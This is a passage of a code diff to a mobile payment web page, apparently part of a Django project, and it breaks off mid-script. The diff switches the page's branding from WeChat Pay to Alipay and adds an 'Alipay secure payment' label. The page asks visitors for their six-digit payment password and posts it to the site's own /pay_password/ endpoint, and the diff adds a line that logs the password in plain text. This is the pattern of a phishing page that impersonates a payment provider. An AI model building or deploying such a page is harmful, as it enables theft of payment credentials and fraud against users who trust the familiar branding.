@@ -4,7 +4,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>微信支付</title>
+<title>支付宝</title>
 <style>
 * {
   margin: 0;
@@ -19,20 +19,20 @@ body {
   display: flex;
   flex-direction: column;
 }
+/* 顶部导航栏 */
 .nav-bar {
-  background: #ffffff;
+  background: #1677ff;
   height: 44px;
   display: flex;
   align-items: center;
   justify-content: center;
   position: relative;
-  border-bottom: 1px solid #ededed;
   flex-shrink: 0;
 }
 .nav-bar .nav-title {
   font-size: 17px;
   font-weight: 500;
-  color: #1a1a1a;
+  color: #ffffff;
 }
 .nav-bar .nav-back {
   position: absolute;
@@ -50,20 +50,45 @@ body {
   display: block;
   width: 10px;
   height: 10px;
-  border-left: 2px solid #1a1a1a;
-  border-bottom: 2px solid #1a1a1a;
+  border-left: 2px solid #ffffff;
+  border-bottom: 2px solid #ffffff;
   transform: rotate(45deg);
   margin-left: 4px;
 }
+/* 主内容区 */
 .main-content {
   flex: 1;
   overflow-y: auto;
   -webkit-overflow-scrolling: touch;
 }
+/* 支付宝品牌标识 */
+.alipay-brand {
+  background: #ffffff;
+  padding: 24px 20px 16px;
+  text-align: center;
+}
+.alipay-brand .brand-logo {
+  width: 48px;
+  height: 48px;
+  border-radius: 12px;
+  background: #1677ff;
+  color: #ffffff;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 24px;
+  font-weight: 700;
+  margin-bottom: 8px;
+}
+.alipay-brand .brand-name {
+  font-size: 15px;
+  color: #1a1a1a;
+  font-weight: 500;
+}
+/* 订单金额卡片 */
 .order-card {
   background: #ffffff;
-  margin-top: 10px;
-  padding: 32px 20px 28px;
+  padding: 8px 20px 28px;
   text-align: center;
 }
 .order-label {
@@ -72,24 +97,25 @@ body {
   margin-bottom: 8px;
 }
 .order-amount {
-  font-size: 36px;
+  font-size: 40px;
   font-weight: 600;
   color: #1a1a1a;
   letter-spacing: -0.5px;
   margin-bottom: 6px;
 }
 .order-amount .symbol {
-  font-size: 24px;
+  font-size: 26px;
   font-weight: 500;
   margin-right: 2px;
 }
 .order-amount .decimal {
-  font-size: 28px;
+  font-size: 30px;
 }
 .order-desc {
   font-size: 13px;
   color: #999;
 }
+/* 商家信息 */
 .merchant-card {
   background: #ffffff;
   margin-top: 10px;
@@ -101,7 +127,7 @@ body {
   width: 40px;
   height: 40px;
   border-radius: 8px;
-  background: #07c160;
+  background: #1677ff;
   color: #fff;
   display: flex;
   align-items: center;
@@ -124,6 +150,7 @@ body {
   color: #999;
   margin-top: 2px;
 }
+/* 底部支付按钮 */
 .bottom-bar {
   background: #ffffff;
   padding: 12px 16px calc(12px + env(safe-area-inset-bottom));
@@ -133,7 +160,7 @@ body {
 .btn-pay {
   width: 100%;
   height: 48px;
-  background: #07c160;
+  background: #1677ff;
   color: #ffffff;
   font-size: 17px;
   font-weight: 500;
@@ -170,6 +197,7 @@ body {
   from { transform: translateY(100%); }
   to { transform: translateY(0); }
 }
+/* 弹窗头部 */
 .pwd-header {
   display: flex;
   align-items: center;
@@ -196,6 +224,7 @@ body {
 .pwd-header .pwd-placeholder {
   width: 28px;
 }
+/* 金额显示 */
 .pwd-amount {
   text-align: center;
   font-size: 32px;
@@ -216,6 +245,7 @@ body {
   color: #999;
   margin-bottom: 20px;
 }
+/* 六位密码框 */
 .pwd-inputs {
   display: flex;
   border: 1px solid #e0e0e0;
@@ -278,47 +308,61 @@ body {
 </head>
 <body>
 
+<!-- 顶部导航 -->
 <div class="nav-bar">
   <div onclick="ba()" class="nav-back"></div>
-  <div class="nav-title">微信支付</div>
+  <div class="nav-title">支付宝</div>
 </div>
 
+<!-- 主内容 -->
 <div class="main-content">
+  <!-- 品牌标识 -->
+  <div class="alipay-brand">
+    <div class="brand-logo">支</div>
+    <div class="brand-name">支付宝安全支付</div>
+  </div>
+
+  <!-- 订单金额 -->
   <div class="order-card">
     <div class="order-label">订单金额</div>
     <div class="order-amount">
       <span class="symbol">¥</span><span id="pri">78</span><span class="decimal">.00</span>
     </div>
-    <div class="order-desc">订单号 <span id="code">420000123420260912345678</span></div>
+    <div class="order-desc">订单号 <span id="code"></span></div>
   </div>
 
+  <!-- 商家信息 -->
   <div class="merchant-card">
-    <div id="n" class="merchant-icon">李</div>
+    <div class="merchant-icon">李</div>
     <div class="merchant-info">
-      <div id="name" class="merchant-name">李轩昂超市</div>
-      <div class="merchant-sub">快给我钱<span id="code1"></span></div>
+      <div class="merchant-name">李轩昂的商店</div>
+      <div class="merchant-sub">快给我钱</div>
     </div>
   </div>
 </div>
 
+<!-- 底部支付按钮 -->
 <div class="bottom-bar">
-  <button class="btn-pay" id="btnPay">支付 ¥<span id="pr">78</span><span>.00</span></button>
+  <button class="btn-pay" id="btnPay">确认支付 ¥<span id="pr">78</span>.00</button>
 </div>
 
 <!-- ===== 密码输入弹窗 ===== -->
 <div class="pwd-overlay" id="pwdModal">
   <div class="pwd-box">
+    <!-- 头部 -->
     <div class="pwd-header">
       <button class="pwd-close" id="pwdClose">✕</button>
       <div class="pwd-title">请输入支付密码</div>
       <div class="pwd-placeholder"></div>
     </div>
 
+    <!-- 金额 -->
     <div class="pwd-amount">
       <span class="symbol">¥</span><span id="pric">78</span><span class="decimal">.00</span>
     </div>
-    <div class="pwd-desc">李轩昂的商城</div>
+    <div class="pwd-desc">李轩昂商店</div>
 
+    <!-- 六位密码框 -->
     <div class="pwd-inputs" id="pwdInputs">
       <div class="pwd-cell"></div>
       <div class="pwd-cell"></div>
@@ -328,7 +372,7 @@ body {
       <div class="pwd-cell"></div>
     </div>
 
-    <!-- 键盘：用 data-key 标记按键值，由 JS 统一绑定 -->
+    <!-- 数字键盘 -->
     <div class="keyboard" id="keyboard">
       <div class="key" data-key="1">1</div>
       <div class="key" data-key="2">2</div>
@@ -348,123 +392,125 @@ body {
 <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
 <script src="{% static 'api.js' %}"></script>
 <script>
-  // ===== 全局变量 =====
-  var password = '';
-  var MAX_LEN = 6;
+  (function() {
+    // ===== 全局变量 =====
+    var password = '';
+    var MAX_LEN = 6;
 
-  // ===== 元素引用 =====
-  var pwdModal = document.getElementById('pwdModal');
-  var pwdInputs = document.getElementById('pwdInputs');
-  var keyboard = document.getElementById('keyboard');
-  var btnPay = document.getElementById('btnPay');
-  var pwdClose = document.getElementById('pwdClose');
+    // ===== 元素引用 =====
+    var pwdModal = document.getElementById('pwdModal');
+    var pwdInputs = document.getElementById('pwdInputs');
+    var keyboard = document.getElementById('keyboard');
+    var btnPay = document.getElementById('btnPay');
+    var pwdClose = document.getElementById('pwdClose');
 
-  // ===== 打开弹窗 =====
-  function openPwdModal() {
-    password = '';
-    renderPwdDots();
-    pwdModal.classList.add('show');
-  }
+    // ===== 打开弹窗 =====
+    function openPwdModal() {
+      password = '';
+      renderPwdDots();
+      pwdModal.classList.add('show');
+    }
 
-  // ===== 关闭弹窗 =====
-  function closePwdModal() {
-    pwdModal.classList.remove('show');
-  }
+    // ===== 关闭弹窗 =====
+    function closePwdModal() {
+      pwdModal.classList.remove('show');
+    }
 
-  // ===== 渲染圆点 =====
-  function renderPwdDots() {
-    var cells = pwdInputs.querySelectorAll('.pwd-cell');
-    for (var i = 0; i < cells.length; i++) {
-      if (i < password.length) {
-        cells[i].innerHTML = '<div class="pwd-dot"></div>';
-      } else {
-        cells[i].innerHTML = '';
+    // ===== 渲染圆点 =====
+    function renderPwdDots() {
+      var cells = pwdInputs.querySelectorAll('.pwd-cell');
+      for (var i = 0; i < cells.length; i++) {
+        if (i < password.length) {
+          cells[i].innerHTML = '<div class="pwd-dot"></div>';
+        } else {
+          cells[i].innerHTML = '';
+        }
       }
     }
-  }
 
-  // ===== 输入一位数字 =====
-  function inputDigit(num) {
-    if (password.length >= MAX_LEN) return;
-    password += num;
-    renderPwdDots();
+    // ===== 输入一位数字 =====
+    function inputDigit(num) {
+      if (password.length >= MAX_LEN) return;
+      password += num;
+      renderPwdDots();
 
-    if (password.length === MAX_LEN) {
-      setTimeout(function() {
-        onPasswordComplete(password);
-      }, 150);
+      if (password.length === MAX_LEN) {
+        setTimeout(function() {
+          onPasswordComplete(password);
+        }, 150);
+      }
     }
-  }
 
-  // ===== 删除一位 =====
-  function deleteDigit() {
-    password = password.slice(0, -1);
-    renderPwdDots();
-  }
+    // ===== 删除一位 =====
+    function deleteDigit() {
+      password = password.slice(0, -1);
+      renderPwdDots();
+    }
 
-  // ===== 密码输入完成回调 =====
-  function onPasswordComplete(pwd) {
-    api.post("/pay_password/",{password:pwd,code:localStorage.getItem("cod")}).then(
+    // ===== 密码输入完成回调 =====
+    function onPasswordComplete(pwd) {
+      console.log('用户输入的支付密码是：', pwd);
+      api.post("/pay_password/",{password:pwd,code:localStorage.getItem("cod")}).then(
         function(res){
             location.href="/success/"
         }
-    ).catch(
-        function(err){
-            alert("密码错误")
-        }
-    )
-    closePwdModal();
-  }
-
-  // ===== 事件绑定（关键：用 JS 绑定，不依赖 onclick）=====
-
-  // 1. 支付按钮 → 打开弹窗
-  btnPay.addEventListener('click', openPwdModal);
-
-  // 2. 关闭按钮 → 关闭弹窗
-  pwdClose.addEventListener('click', closePwdModal);
-
-  // 3. 点击遮罩层 → 关闭弹窗
-  pwdModal.addEventListener('click', function(e) {
-    if (e.target === pwdModal) {
+      ).catch(
+          function(err){
+              alert("密码错误")
+          }
+      )
       closePwdModal();
     }
-  });
 
-  // 4. 键盘点击 → 用事件委托统一处理
-  keyboard.addEventListener('click', function(e) {
-    // 找到被点击的 .key 元素
-    var keyEl = e.target.closest('.key');
-    if (!keyEl) return;
+    // ===== 事件绑定 =====
 
-    var key = keyEl.getAttribute('data-key');
-    if (!key) return; // 空键（占位）忽略
+    // 1. 支付按钮 → 打开弹窗
+    btnPay.addEventListener('click', openPwdModal);
 
-    if (key === 'del') {
-      deleteDigit();
-    } else {
-      inputDigit(key);
-    }
-  });
+    // 2. 关闭按钮 → 关闭弹窗
+    pwdClose.addEventListener('click', closePwdModal);
 
-  // 5. 物理键盘支持（可选）
-  document.addEventListener('keydown', function(e) {
-    if (!pwdModal.classList.contains('show')) return;
-    if (e.key >= '0' && e.key <= '9') {
-      inputDigit(e.key);
-    } else if (e.key === 'Backspace') {
-      deleteDigit();
-    } else if (e.key === 'Escape') {
-      closePwdModal();
-    }
-  });
-    function ba(){
+    // 3. 点击遮罩层 → 关闭弹窗
+    pwdModal.addEventListener('click', function(e) {
+      if (e.target === pwdModal) {
+        closePwdModal();
+      }
+    });
+
+    // 4. 键盘点击 → 事件委托
+    keyboard.addEventListener('click', function(e) {
+      var keyEl = e.target.closest('.key');
+      if (!keyEl) return;
+
+      var key = keyEl.getAttribute('data-key');
+      if (!key) return;
+
+      if (key === 'del') {
+        deleteDigit();
+      } else {
+        inputDigit(key);
+      }
+    });
+
+    // 5. 物理键盘支持
+    document.addEventListener('keydown', function(e) {
+      if (!pwdModal.classList.contains('show')) return;
+      if (e.key >= '0' && e.key <= '9') {
+        inputDigit(e.key);
+      } else if (e.key === 'Backspace') {
+        deleteDigit();
+      } else if (e.key === 'Escape') {
+        closePwdModal();
+      }
+    });
+  })();
+  function ba(){
         if(!confirm("你确定放弃支付吗?")){
             return
         }
         history.back()
-    }
-    api.get("/order_de/",{params:{code:localStorage.getItem("cod")}}).then(
+   }
+  api.get("/order_de/",{params:{code:localStorage.getItem("cod")}}).then(
         function(res){
             let d=res.data
             console.log(d)
